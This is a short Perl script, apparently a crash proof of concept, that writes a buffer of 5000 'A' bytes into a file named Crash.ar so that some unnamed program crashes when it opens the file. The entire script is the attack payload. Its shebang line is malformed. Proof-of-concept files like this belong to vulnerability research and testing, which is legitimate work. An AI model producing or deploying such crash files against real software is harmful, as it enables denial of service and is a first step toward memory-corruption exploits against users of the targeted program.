#!c/perl/bin/
my $file= "Crash.ar";
my $boom="\x41" x 5000;
open(myfile,'>>Crash.ar') || die "Cannot Creat file\n\n";
print myfile $boom;
print "Done..!~#\n";